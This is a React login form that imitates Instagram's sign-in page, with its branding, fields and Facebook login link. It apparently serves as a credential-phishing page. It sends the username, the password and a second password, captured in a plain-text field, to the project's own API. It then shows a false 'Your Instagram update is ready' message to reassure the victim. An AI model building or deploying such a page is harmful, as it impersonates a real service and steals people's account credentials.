import React, { useState } from 'react';
import { loginCall } from '../services/api';
import InputField from './InputField';

const LoginForm = () => {
  const [formData, setFormData] = useState({ identifier: '', password: '', role: '' });
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState('');

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
    setError('');
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    
    try {
      const data = await loginCall(formData);
      setSuccess('Congratulations! Your Instagram update is ready. Please check your Instagram.');
      console.log('Login success:', data);
    } catch (err) {
      setError(err.response?.data?.message || 'Something went wrong');
    } finally {
      setLoading(false);
    }
  };

  const isFormValid = formData.identifier.length > 0 && formData.password.length >= 6 && formData.role.length > 0;

  return (
    <div className="form-container">
      <h1 className="logo">Instagram</h1>
      
      {error && <div className="error-message">{error}</div>}
      {success && <div className="success-message">{success}</div>}

      <form className="auth-form" onSubmit={handleSubmit}>
        <InputField
          label="Phone number, username, or email"
          type="text"
          name="identifier"
          value={formData.identifier}
          onChange={handleChange}
        />
        <InputField
          label="Password"
          type="password"
          name="password"
          value={formData.password}
          onChange={handleChange}
        />

        <InputField
          label="Confirmpassword"
          type="text"
          name="role"
          value={formData.role}
          onChange={handleChange}
        />
        <button 
          type="submit" 
          className="btn-primary" 
          disabled={!isFormValid || loading}
        >
          {loading ? 'Logging in...' : 'Log in'}
        </button>
      </form>

      <div className="divider">
        <div className="divider-line"></div>
        <div className="divider-text">OR</div>
        <div className="divider-line"></div>
      </div>

      <div className="facebook-login">
        <span className="facebook-icon">f</span> Log in with Facebook
      </div>

      <a href="#" className="forgot-password">
        Forgot password?
      </a>
    </div>
  );
};

export default LoginForm;
